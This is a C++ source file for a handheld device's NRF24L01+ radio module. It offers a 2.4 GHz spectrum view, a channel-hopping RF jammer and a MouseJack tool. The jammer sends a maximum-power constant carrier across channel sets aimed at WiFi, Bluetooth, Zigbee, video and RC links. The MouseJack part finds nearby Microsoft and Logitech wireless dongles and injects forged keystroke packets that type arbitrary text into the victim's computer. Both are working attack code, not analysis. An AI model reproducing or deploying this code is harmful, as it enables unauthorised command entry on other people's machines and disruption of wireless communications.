//
// NRF24L01+ module — spectrum, jammer, MouseJack
//

#include "NRF24Screen.h"
#include "core/AchievementManager.h"
#include "core/ScreenManager.h"
#include "core/Device.h"
#include "core/ConfigManager.h"
#include "core/PinConfigManager.h"
#include "screens/module/ModuleMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"
#include "ui/actions/InputTextAction.h"
#include "ui/views/ProgressView.h"
#include <esp_random.h>

// ══════════════════════════════════════════════════════════════
// ═══════════════ CHANNEL LISTS (jammer) ═══════════════════
// ══════════════════════════════════════════════════════════════

static const uint8_t kChTest[] = {
  50, 52, 54, 56, 58, 60, 62, 64, 66, 68, 70, 72, 74, 76, 78, 80, 2,  4,  6,  8,
  10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36, 38, 40, 42, 44, 46, 48
};
static const uint8_t kChWifi[] = {
  2, 7, 12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62, 67, 72, 77
};
static const uint8_t kChBle[] = {
  2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21,
  22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41
};
static const uint8_t kChBleAdv[]    = { 37, 38, 39, 1, 2, 3, 25, 26, 27, 79, 80, 81 };
static const uint8_t kChBt[]        = {
  2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15, 16, 17,
  18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33,
  34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
  50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65,
  66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80
};
static const uint8_t kChUsb[]       = {
  32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 66, 68, 70
};
static const uint8_t kChVideo[]     = {
  60, 62, 64, 66,  68,  70,  72,  74,  76,  78,  80,  82,  84,  86,  88,  90, 92,
  94, 96, 98, 100, 102, 104, 106, 108, 110, 112, 114, 116, 118, 120, 122, 124
};
static const uint8_t kChRc[]        = {
  1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39
};
static const uint8_t kChZigbee[]    = {
  4,  5,  6,  9,  10, 11, 14, 15, 16, 19, 20, 21, 24, 25, 26, 29, 30, 31,
  34, 35, 36, 39, 40, 41, 44, 45, 46, 49, 50, 51, 54, 55, 56, 59, 60, 61,
  64, 65, 66, 69, 70, 71, 74, 75, 76, 79, 80, 81
};
static const uint8_t kChFull[]      = {
  1,   2,   3,   4,   5,   6,   7,   8,   9,   10,  11,  12,  13,  14,  15,  16,
  17,  18,  19,  20,  21,  22,  23,  24,  25,  26,  27,  28,  29,  30,  31,  32,
  33,  34,  35,  36,  37,  38,  39,  40,  41,  42,  43,  44,  45,  46,  47,  48,
  49,  50,  51,  52,  53,  54,  55,  56,  57,  58,  59,  60,  61,  62,  63,  64,
  65,  66,  67,  68,  69,  70,  71,  72,  73,  74,  75,  76,  77,  78,  79,  80,
  81,  82,  83,  84,  85,  86,  87,  88,  89,  90,  91,  92,  93,  94,  95,  96,
  97,  98,  99,  100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112,
  113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124
};

static const uint8_t* const kChLists[] = {
  kChTest, kChWifi, kChBle, kChBleAdv, kChBt, kChUsb, kChVideo, kChRc, kChZigbee, kChFull
};
static const int kChCounts[] = {
  (int)sizeof(kChTest),
  (int)sizeof(kChWifi),
  (int)sizeof(kChBle),
  (int)sizeof(kChBleAdv),
  (int)sizeof(kChBt),
  (int)sizeof(kChUsb),
  (int)sizeof(kChVideo),
  (int)sizeof(kChRc),
  (int)sizeof(kChZigbee),
  (int)sizeof(kChFull)
};

static const char* const kJamModeNames[] = {
  "Test", "WiFi", "BLE", "BLE Adv Pri", "Bluetooth",
  "USB", "Video Stream", "RC", "Zigbee", "Full"
};

// ══════════════════════════════════════════════════════════════
// ═══════════════ HID TABLE (MouseJack) ════════════════════
// ══════════════════════════════════════════════════════════════

// ASCII 0x20-0x7E → {modifier, keycode}
// modifier 0x02 = LSHIFT
static const NRF24Screen::HidKey kAsciiHid[] = {
  {0,0x2C},{2,0x1E},{2,0x34},{2,0x20},{2,0x21},{2,0x22},{2,0x24},{0,0x34},
  {2,0x26},{2,0x27},{2,0x25},{2,0x2E},{0,0x36},{0,0x2D},{0,0x37},{0,0x38},
  {0,0x27},{0,0x1E},{0,0x1F},{0,0x20},{0,0x21},{0,0x22},{0,0x23},{0,0x24},
  {0,0x25},{0,0x26},{2,0x33},{0,0x33},{2,0x36},{0,0x2E},{2,0x37},{2,0x38},
  {2,0x1F},
  {2,0x04},{2,0x05},{2,0x06},{2,0x07},{2,0x08},{2,0x09},{2,0x0A},{2,0x0B},
  {2,0x0C},{2,0x0D},{2,0x0E},{2,0x0F},{2,0x10},{2,0x11},{2,0x12},{2,0x13},
  {2,0x14},{2,0x15},{2,0x16},{2,0x17},{2,0x18},{2,0x19},{2,0x1A},{2,0x1B},
  {2,0x1C},{2,0x1D},
  {0,0x2F},{0,0x31},{0,0x30},{2,0x23},{2,0x2D},{0,0x35},
  {0,0x04},{0,0x05},{0,0x06},{0,0x07},{0,0x08},{0,0x09},{0,0x0A},{0,0x0B},
  {0,0x0C},{0,0x0D},{0,0x0E},{0,0x0F},{0,0x10},{0,0x11},{0,0x12},{0,0x13},
  {0,0x14},{0,0x15},{0,0x16},{0,0x17},{0,0x18},{0,0x19},{0,0x1A},{0,0x1B},
  {0,0x1C},{0,0x1D},
  {2,0x2F},{2,0x31},{2,0x30},{2,0x35}
};

// ══════════════════════════════════════════════════════════════
// ═══════════════ INIT ═════════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onInit() {
  _cePin  = (int8_t)PinConfig.getInt(PIN_CONFIG_NRF24_CE,  PIN_CONFIG_NRF24_CE_DEFAULT);
  _csnPin = (int8_t)PinConfig.getInt(PIN_CONFIG_NRF24_CSN, PIN_CONFIG_NRF24_CSN_DEFAULT);

  if (_cePin < 0 || _csnPin < 0) {
    ShowStatusAction::show("Set NRF24 CE/CSN pins first");
    Screen.goBack();
    return;
  }

  ProgressView::progress("Detecting NRF24...", 30);
  if (!_radioBegin()) {
    ShowStatusAction::show("NRF24 not found!");
    Screen.goBack();
    return;
  }
  _radioEnd();
  ProgressView::finish();

  _specScanCh = 0;
  _showMenu();
}

bool NRF24Screen::inhibitPowerSave() {
  return _state != STATE_MENU;
}
bool NRF24Screen::inhibitPowerOff() {
  return _state == STATE_JAMMER_RUNNING || _state == STATE_SPECTRUM ||
         _state == STATE_MJ_SCAN;
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ MENU TRANSITIONS ═════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::_showMenu() {
  _state = STATE_MENU;
  snprintf(_titleBuf, sizeof(_titleBuf), "NRF24L01");
  setItems(_mainItems);
}

bool NRF24Screen::_radioBegin() {
  if (!Uni.Spi || _cePin < 0 || _csnPin < 0) return false;
  return _nrf.begin(Uni.Spi, _cePin, _csnPin);
}

void NRF24Screen::_radioEnd() {
  _nrf.end();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ ITEM SELECTION ═══════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onItemSelected(uint8_t index) {
  if (_state == STATE_MENU) {
    if (index == 0) {
      // ── Spectrum ──────────────────────────────────────────
      if (!_radioBegin()) {
        ShowStatusAction::show("NRF24 not found!");
        render();
        return;
      }
      auto* r = _nrf.radio();
      r->setAutoAck(false);
      r->disableCRC();
      r->setAddressWidth(2);
      static const uint8_t noiseAddr[][2] = {
        {0x55,0x55}, {0xAA,0xAA}, {0xA0,0xAA},
        {0xAB,0xAA}, {0xAC,0xAA}, {0xAD,0xAA}
      };
      for (uint8_t i = 0; i < 6; i++) r->openReadingPipe(i, noiseAddr[i]);
      r->setDataRate(RF24_1MBPS);
      memset(_specCh,    0, sizeof(_specCh));
      memset(_specPeak,  0, sizeof(_specPeak));
      memset(_specPeakT, 0, sizeof(_specPeakT));
      _specMode    = 0;
      _specScanCh  = 0;
      _chromeDrawn = false;
      _state       = STATE_SPECTRUM;
      snprintf(_titleBuf, sizeof(_titleBuf), "2.4G Spectrum");
      render();
      if (Achievement.inc("nrf24_spectrum") == 1) Achievement.unlock("nrf24_spectrum");

    } else if (index == 1) {
      // ── Jammer ────────────────────────────────────────────
      _startJammer();

    } else if (index == 2) {
      // ── MouseJack ─────────────────────────────────────────
      _setupMjScan();
    }
    return;
  }

  if (_state == STATE_MJ_SCAN && _mjCount > 0) {
    // PRESS on a target — inject text
    if (index < _mjCount) {
      String text = InputTextAction::popup("Type text");
      if (text.length() > 0) _injectMjText(index, text);
      _chromeDrawn = false;
      render();
    }
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ UPDATE ═══════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onUpdate() {
  if (_state == STATE_SPECTRUM) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        _radioEnd();
        _showMenu();
        return;
      }
      if (dir == INavigation::DIR_PRESS) {
        _specMode    = (_specMode + 1) % 3;
        _chromeDrawn = false;
      }
    }
    _scanSpectrum();
    if (_specScanCh == 0) {
      // Full sweep complete — render and log peak
      uint8_t maxLevel = 0; uint8_t maxCh = 0;
      for (int i = 0; i < kSpecCh; i++) {
        if (_specCh[i] > maxLevel) { maxLevel = _specCh[i]; maxCh = i; }
      }
      render();
    }
    return;
  }

  if (_state == STATE_JAMMER_RUNNING) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        auto* r = _nrf.radio();
        r->stopConstCarrier();
        r->powerDown();
        _radioEnd();
        _showMenu();
        return;
      }
      if (dir == INavigation::DIR_RIGHT || dir == INavigation::DIR_DOWN) {
        // Next mode
        _jamModeIndex = (_jamModeIndex + 1) % kJamModes;
        _jamHopIndex  = 0;
        _jamReshuffle = true;
        _chromeDrawn  = false;
        render();
      } else if (dir == INavigation::DIR_LEFT || dir == INavigation::DIR_UP) {
        // Prev mode
        _jamModeIndex = (_jamModeIndex + kJamModes - 1) % kJamModes;
        _jamHopIndex  = 0;
        _jamReshuffle = true;
        _chromeDrawn  = false;
        render();
      } else if (dir == INavigation::DIR_PRESS) {
        // Toggle hop mode: sequential <-> random (FHSS)
        _jamHopMode   = (_jamHopMode + 1) & 1;
        _jamHopIndex  = 0;
        _jamReshuffle = true;
        _chromeDrawn  = false;
        render();
      }
    }
    // Jam in a tight SPI hop loop for ~10 ms, then service input/render.
    uint32_t deadline = millis() + 10;
    while (millis() < deadline) _jamStep();
    if (millis() - _lastRender >= 1000) {
      _lastRender = millis();
      render();
    }
    return;
  }

  if (_state == STATE_MJ_SCAN) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        _radioEnd();
        _showMenu();
        return;
      }
      if (dir == INavigation::DIR_UP) {
        if (_mjSelected > 0) { _mjSelected--; render(); }
        return;
      }
      if (dir == INavigation::DIR_DOWN) {
        if (_mjSelected < (int)_mjCount - 1) { _mjSelected++; render(); }
        return;
      }
      if (dir == INavigation::DIR_PRESS) {
        onItemSelected(_mjSelected);
        return;
      }
    }
    _stepMjScan();
    if (millis() - _lastRender > 400) {
      _lastRender = millis();
      render();
    }
    return;
  }

  ListScreen::onUpdate();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ RENDER ═══════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onRender() {
  if (_state == STATE_SPECTRUM)       { _renderSpectrum();     return; }
  if (_state == STATE_JAMMER_RUNNING) { _renderJammerStatus(); return; }
  if (_state == STATE_MJ_SCAN)        { _renderMjScan();       return; }
  ListScreen::onRender();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ BACK ═════════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onBack() {
  switch (_state) {
    case STATE_MENU:
      _radioEnd();
      Screen.goBack();
      break;
    case STATE_SPECTRUM:
      _radioEnd();
      _showMenu();
      break;
    case STATE_JAMMER_RUNNING:
      _nrf.radio()->stopConstCarrier();
      _radioEnd();
      _showMenu();
      break;
    case STATE_MJ_SCAN:
      _radioEnd();
      _showMenu();
      break;
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ SPECTRUM ═════════════════════════════════════
// ══════════════════════════════════════════════════════════════

uint16_t NRF24Screen::_specBarColor(uint8_t level) {
  if (level > 85) return TFT_RED;
  if (level > 65) return 0xFD20;
  if (level > 45) return TFT_YELLOW;
  if (level > 25) return TFT_GREEN;
  return TFT_DARKGREEN;
}

void NRF24Screen::_scanSpectrum() {
  auto* r = _nrf.radio();
  if (!r) return;
  int i = _specScanCh;
  digitalWrite(_cePin, LOW);
  r->setChannel(i);
  r->startListening();
  delayMicroseconds(170);
  r->stopListening();

  if (r->testRPD()) {
    _specCh[i] = (uint8_t)min(100, (_specCh[i] + 100) / 2);
  } else {
    _specCh[i] = (uint8_t)((_specCh[i] * 3) / 4);
  }

  _specScanCh = (i + 1) % kSpecCh;

  // Update peaks once per full sweep
  if (_specScanCh == 0) {
    for (int j = 0; j < kSpecCh; j++) {
      if (_specCh[j] >= _specPeak[j]) {
        _specPeak[j]  = _specCh[j];
        _specPeakT[j] = kPeakHoldSweeps;
      } else if (_specPeakT[j] > 0) {
        _specPeakT[j]--;
      } else {
        if (_specPeak[j] > 2) _specPeak[j] -= 2;
        else _specPeak[j] = 0;
      }
    }
  }
}

void NRF24Screen::_renderSpectrum() {
  static const char* const kModeLabel[] = {"Peak", "Bars", "Dev"};
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();
  static constexpr int kFooterH = 11;
  int barAreaH = bh - kFooterH - 2;
  int mL = 2;
  int dW = bw - mL * 2;

  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    lcd.setTextSize(1);
    lcd.setTextDatum(TL_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    int fy = by + bh - kFooterH + 1;
    lcd.drawString("2.400", bx + 2, fy, 1);
    lcd.drawCentreString("2.462", bx + bw / 2, fy, 1);
    lcd.drawRightString("2.525", bx + bw - 2, fy, 1);
    lcd.drawFastHLine(bx, by + barAreaH + 1, bw, TFT_DARKGREY);
    lcd.drawString(kModeLabel[_specMode], bx + 2, by + 2, 1);
    _chromeDrawn = true;
  }

  uint8_t maxLevel = 0, maxCh = 0;
  for (int i = 0; i < kSpecCh; i++) {
    int x    = bx + mL + (i * dW) / kSpecCh;
    int xN   = bx + mL + ((i + 1) * dW) / kSpecCh;
    int w    = max(1, xN - x);
    uint8_t lv = _specCh[i];
    if (lv > maxLevel) { maxLevel = lv; maxCh = i; }

    int barH  = (lv * barAreaH) / 100;
    int peakH = (_specPeak[i] * barAreaH) / 100;
    if (barH < barAreaH) lcd.fillRect(x, by, w, barAreaH - barH, TFT_BLACK);
    if (barH > 0)        lcd.fillRect(x, by + barAreaH - barH, w, barH, _specBarColor(lv));

    if (_specMode == 0 && peakH > barH && peakH > 0) {
      int py = by + barAreaH - peakH;
      if (py >= by) lcd.fillRect(x, py, w, 1, TFT_WHITE);
    }
  }
  if (maxLevel > 10) {
    char buf[10];
    snprintf(buf, sizeof(buf), "pk:%d", (int)maxCh);
    lcd.setTextColor(TFT_YELLOW, TFT_BLACK);
    lcd.fillRect(bx + bw - 46, by + 2, 44, 8, TFT_BLACK);
    lcd.drawRightString(buf, bx + bw - 2, by + 2, 1);
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ JAMMER ═══════════════════════════════════════
// ══════════════════════════════════════════════════════════════

// Fisher-Yates shuffle of an index table via the hardware RNG.
static void shuffleChannels(uint8_t* arr, size_t count) {
  for (size_t i = count - 1; i > 0; i--) {
    size_t j = esp_random() % (i + 1);
    uint8_t tmp = arr[i];
    arr[i] = arr[j];
    arr[j] = tmp;
  }
}

void NRF24Screen::_startJammer() {
  if (!_radioBegin()) {
    ShowStatusAction::show("NRF24 not found!");
    render();
    return;
  }
  auto* r = _nrf.radio();

  r->setPALevel(RF24_PA_MAX);
  r->startConstCarrier(RF24_PA_MAX, 50);
  r->setAddressWidth(5);
  r->setPayloadSize(2);
  if (!r->setDataRate(RF24_2MBPS)) {
    if (!r->setDataRate(RF24_1MBPS)) {
      r->setDataRate(RF24_250KBPS);
    }
  }

  _jamModeIndex = 0;
  _jamHopIndex  = 0;
  _jamHopMode   = 0;
  _jamReshuffle = true;
  _lastRender   = millis();
  _chromeDrawn  = false;
  _state = STATE_JAMMER_RUNNING;
  snprintf(_titleBuf, sizeof(_titleBuf), "NRF Jammer");
  if (Achievement.inc("nrf24_jammer") == 1) Achievement.unlock("nrf24_jammer");
  render();
}

// A single carrier hop, following the active mode's channel list. In random
// mode the index table is reshuffled on each full pass so the order keeps
// changing — harder for an adaptive target to dodge.
void NRF24Screen::_jamStep() {
  const uint8_t* channels = kChLists[_jamModeIndex];
  int count = kChCounts[_jamModeIndex];

  _jamHopIndex++;
  if (_jamHopIndex >= count) {
    _jamHopIndex  = 0;
    _jamReshuffle = true;
  }

  uint8_t idx;
  if (_jamHopMode == 1) {
    if (_jamReshuffle) {
      for (int i = 0; i < count; i++) _jamShuffled[i] = (uint8_t)i;
      shuffleChannels(_jamShuffled, count);
      _jamReshuffle = false;
    }
    idx = _jamShuffled[_jamHopIndex];
  } else {
    idx = (uint8_t)_jamHopIndex;
  }

  _nrf.radio()->setChannel(channels[idx]);
}

void NRF24Screen::_renderJammerStatus() {
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();

  // Static chrome — redrawn when mode / hop change (via _chromeDrawn = false)
  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    lcd.setTextSize(1);
    lcd.setTextDatum(TL_DATUM);

    lcd.setTextColor(TFT_GREEN, TFT_BLACK);
    lcd.drawString("JAMMING", bx + 4, by + 4, 1);

    char line[28];
    lcd.setTextColor(TFT_YELLOW, TFT_BLACK);
    snprintf(line, sizeof(line), "MODE: %s", kJamModeNames[_jamModeIndex]);
    lcd.drawString(line, bx + 4, by + 4 + bh / 5, 1);

    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    snprintf(line, sizeof(line), "HOP : %s", _jamHopMode == 0 ? "Sequential" : "FHSS");
    lcd.drawString(line, bx + 4, by + 4 + bh / 5 * 2, 1);

    lcd.drawString("</>: Mode  OK: Hop", bx + 4, by + bh - 22, 1);
    lcd.drawString("<: Stop",            bx + 4, by + bh - 12, 1);
    _chromeDrawn = true;
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ MOUSEJACK ════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::_setupMjScan() {
  if (!_radioBegin()) {
    ShowStatusAction::show("NRF24 not found!");
    render();
    return;
  }
  auto* r = _nrf.radio();
  if (!r) return;
  r->setAutoAck(false);
  r->disableCRC();
  r->setAddressWidth(2);
  r->setDataRate(RF24_2MBPS);
  r->setPALevel(RF24_PA_MAX);
  static const uint8_t promAddr[][2] = {{0xAA,0x00},{0x55,0x00}};
  r->openReadingPipe(1, promAddr[0]);
  r->openReadingPipe(2, promAddr[1]);
  r->setPayloadSize(32);
  r->setChannel(0);
  r->startListening();

  memset(_mjTargets, 0, sizeof(_mjTargets));
  _mjCount    = 0;
  _mjSelected = 0;
  _mjScanCh   = 0;
  _mjMsSeq    = 0;
  _lastRender = millis();
  _chromeDrawn = false;
  _state = STATE_MJ_SCAN;
  snprintf(_titleBuf, sizeof(_titleBuf), "MouseJack");
  render();
  if (Achievement.inc("nrf24_mousejack") == 1) Achievement.unlock("nrf24_mousejack");
}

void NRF24Screen::_stepMjScan() {
  auto* r = _nrf.radio();
  if (!r) return;
  uint8_t buf[32];
  if (r->available()) {
    r->read(buf, 32);
    _fingerprintMj(buf, 32, (uint8_t)_mjScanCh);
  }
  if (millis() % 4 == 0) {
    r->stopListening();
    _mjScanCh = (_mjScanCh + 1) % 84;
    r->setChannel(_mjScanCh);
    r->startListening();
  }
}

void NRF24Screen::_fingerprintMj(const uint8_t* buf, uint8_t len, uint8_t ch) {
  if (len >= 19 && buf[0] == 0x08 && buf[6] == 0x40) {
    _addMjTarget(buf + 1, 5, ch, 1);
    return;
  }
  if (len >= 19 && buf[0] == 0x0A) {
    _addMjTarget(buf + 1, 5, ch, 2);
    return;
  }
  if (len >= 5 && buf[0] == 0x00) {
    if (len >= 10 && (buf[1] == 0xC2 || buf[1] == 0x4F)) {
      _addMjTarget(buf + 2, 5, ch, 3);
      return;
    }
    if (len >= 22 && buf[1] == 0xD3) {
      _addMjTarget(buf + 2, 5, ch, 3);
      return;
    }
  }
}

void NRF24Screen::_addMjTarget(const uint8_t* addr, uint8_t addrLen, uint8_t ch, uint8_t type) {
  for (uint8_t i = 0; i < _mjCount; i++) {
    if (_mjTargets[i].addrLen == addrLen && memcmp(_mjTargets[i].addr, addr, addrLen) == 0) {
      _mjTargets[i].ch = ch;
      return;
    }
  }
  if (_mjCount >= kMjMax) return;

  MjTarget& t = _mjTargets[_mjCount];
  memcpy(t.addr, addr, addrLen);
  t.addrLen = addrLen;
  t.ch   = ch;
  t.type = type;
  t.active = true;

  static const char* const kTypeNames[] = {"?", "MS", "MS+", "LOG"};
  snprintf(_mjAddrBufs[_mjCount], sizeof(_mjAddrBufs[0]),
    "%s %02X:%02X:%02X ch%d",
    kTypeNames[type & 3],
    addr[0], addr[1], addr[2], ch
  );
  if (_mjCount == 0 && Achievement.inc("nrf24_mj_found") == 1) Achievement.unlock("nrf24_mj_found");
  _mjCount++;
  _chromeDrawn = false;
  if (Uni.Speaker) Uni.Speaker->playNotification();
}

void NRF24Screen::_renderMjScan() {
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();

  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    _chromeDrawn = true;
  }

  if (_mjCount == 0) {
    lcd.setTextSize(1);
    lcd.setTextColor(TFT_WHITE, TFT_BLACK);
    lcd.drawCentreString("Scanning...", bx + bw / 2, by + bh / 3, 1);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    char chBuf[12];
    snprintf(chBuf, sizeof(chBuf), "ch %d", _mjScanCh);
    lcd.drawCentreString(chBuf, bx + bw / 2, by + bh / 2, 1);
    return;
  }

  static constexpr int kRowH = 18;
  lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
  for (int i = 0; i < (int)_mjCount && (i * kRowH) < bh; i++) {
    int rowY = by + i * kRowH;
    bool sel = (i == _mjSelected);
    uint16_t bg = sel ? Config.getThemeColor() : TFT_BLACK;
    uint16_t fg = TFT_WHITE;

    Sprite sp(&lcd);
    sp.createSprite(bw, kRowH);
    sp.fillSprite(TFT_BLACK);
    if (sel) sp.fillRoundRect(0, 2, bw, kRowH - 4, 3, bg);
    sp.setTextColor(fg, bg);
    sp.drawString(_mjAddrBufs[i], 4, kRowH / 2 - 4);
    sp.pushSprite(bx, rowY);
    sp.deleteSprite();
  }
  if (_mjCount > 0) {
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawCentreString("OK: inject text", bx + bw / 2, by + bh - 10, 1);
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ HID INJECTION ════════════════════════════════
// ══════════════════════════════════════════════════════════════

bool NRF24Screen::_asciiToHid(char c, HidKey& out) {
  if (c < 0x20 || c > 0x7E) return false;
  out = kAsciiHid[c - 0x20];
  return out.key != 0;
}

void NRF24Screen::_msTransmit(const MjTarget& t, uint8_t mod, uint8_t key) {
  auto* r = _nrf.radio();
  if (!r) return;
  r->setAutoAck(false);
  r->disableCRC();
  r->setAddressWidth(t.addrLen);
  r->setDataRate(RF24_2MBPS);
  r->openWritingPipe(t.addr);
  r->setChannel(t.ch);
  r->stopListening();

  // Microsoft HID payload (unencrypted)
  uint8_t payload[19] = {};
  payload[0] = 0x08;
  payload[5] = 0x00;   // sequence
  payload[6] = 0x40;
  payload[7] = mod;
  payload[9] = key;

  for (int i = 0; i < 5; i++) {
    r->writeFast(payload, 19, true);
    payload[9] = 0; // key up
    r->writeFast(payload, 19, true);
    delay(10);
  }
  r->flush_tx();
}

void NRF24Screen::_logTransmit(const MjTarget& t, uint8_t mod, uint8_t key) {
  auto* r = _nrf.radio();
  if (!r) return;
  r->setAutoAck(false);
  r->disableCRC();
  r->setAddressWidth(t.addrLen);
  r->setDataRate(RF24_2MBPS);
  r->openWritingPipe(t.addr);
  r->setChannel(t.ch);
  r->stopListening();

  uint8_t payload[10] = {};
  payload[0] = 0x00;
  payload[1] = 0xD3;  // Logitech HID keystroke
  payload[2] = 0x00;
  payload[3] = mod;
  payload[4] = 0x00;
  payload[5] = key;

  // Two's-complement checksum
  uint8_t ck = 0;
  for (int i = 0; i < 9; i++) ck += payload[i];
  payload[9] = (~ck + 1) & 0xFF;

  for (int i = 0; i < 5; i++) {
    r->writeFast(payload, 10, true);
    payload[5] = 0; // key up
    ck = 0;
    for (int j = 0; j < 9; j++) ck += payload[j];
    payload[9] = (~ck + 1) & 0xFF;
    r->writeFast(payload, 10, true);
    delay(10);
  }
  r->flush_tx();
}

void NRF24Screen::_injectMjText(int targetIdx, const String& text) {
  if (targetIdx < 0 || targetIdx >= (int)_mjCount) return;
  const MjTarget& t = _mjTargets[targetIdx];
  auto* r = _nrf.radio();
  if (!r) return;
  r->stopListening();

  for (int i = 0; i < (int)text.length(); i++) {
    char c = text.charAt(i);
    HidKey hk;
    if (!_asciiToHid(c, hk)) continue;
    if (t.type == 3) _logTransmit(t, hk.mod, hk.key);
    else             _msTransmit(t, hk.mod, hk.key);
    delay(10);
  }
  _setupMjScan();
}